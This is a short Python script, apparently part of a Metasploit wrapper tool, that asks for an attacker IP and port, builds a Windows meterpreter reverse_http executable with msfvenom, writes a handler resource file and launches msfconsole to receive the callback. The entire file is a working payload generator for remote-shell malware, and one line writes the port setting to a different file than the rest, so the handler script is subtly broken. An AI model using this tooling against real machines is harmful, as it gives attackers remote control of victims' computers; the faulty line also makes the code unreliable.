import os

banner="""

 /'\_/`\          /'___\ 
/\      \    ____/\ \__/ 
\ \ \__\ \  /',__\ \ ,__|
 \ \ \_/\ \/\__, `\ \ \_/                 
  \ \_\\ \_\/\____/\ \_\ 
   \/_/ \/_/\/___/  \/_/ 

/\  _`\ /\ \            /\_ \  /\_ \     
\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
   /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ `\____\ \_\ \_\ \____\/\____\/\____|
    \/_____/\/_/\/_/\/____/\/____/\/____/

"""

def wind_http():
    os.system("clear")
    print(banner)
    print("Using: windows/meterpreter/reverse_http")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the exe: ")
    print("Ok!")
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: windows/meterpreter/reverse_http")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p windows/meterpreter/reverse_http LHOST="+ip+" LPORT="+port+" -f exe >> "+name+".exe")
    print("Payload created! [01]")
    print("Saved in "+name+".exe")
    print("Running metasploit-framework...")
    os.system("echo 'use exploit/multi/handler' >> windows_http.rb")
    os.system("echo 'set LHOST "+ip+"' >> windows_http.rb")
    os.system("echo 'set LPORT "+port+"' >> windows_tcp.rb")
    os.system("echo 'set PAYLOAD windows/meterpreter/reverse_http' >> windows_http.rb")
    os.system("echo 'exploit' >> windows_http.rb")
    os.system("gnome-terminal -- msfconsole -r windows_http.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")